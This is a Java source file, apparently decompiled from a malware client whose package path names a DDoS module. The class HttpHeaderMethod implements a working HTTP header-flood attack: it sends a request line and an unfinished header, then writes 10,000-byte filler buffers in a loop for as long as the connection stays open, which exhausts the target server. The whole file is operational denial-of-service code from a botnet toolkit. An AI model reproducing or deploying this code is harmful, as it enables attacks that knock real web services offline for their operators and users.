package dev.neko.nekoclient.api.ddos.impl.handler.impl.http;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.WriteMethodHandler;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.ByteChannel;
import java.util.Arrays;
import java.util.function.Supplier;

public class HttpHeaderMethod extends WriteMethodHandler {
   private ByteBuffer firstBuffer;
   private ByteBuffer spamBuffer;

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IOException {
      String method = options.getString("method", "GET");
      String path = options.getString("path", "/");
      String header = options.getString("header", "User-Agent");
      this.firstBuffer = ByteBuffer.wrap((method + " " + path + " " + "HTTP/1.1" + "\r\n" + header + ": ").getBytes());
      byte[] bytes = new byte[10000];
      Arrays.fill(bytes, (byte)97);
      this.spamBuffer = ByteBuffer.wrap(bytes);
   }

   @Override
   public void handle(ByteChannel channel, Supplier<Boolean> connected) throws IOException {
      channel.write(this.firstBuffer.duplicate());

      while(connected.get()) {
         channel.write(this.spamBuffer.duplicate());
      }
   }
}
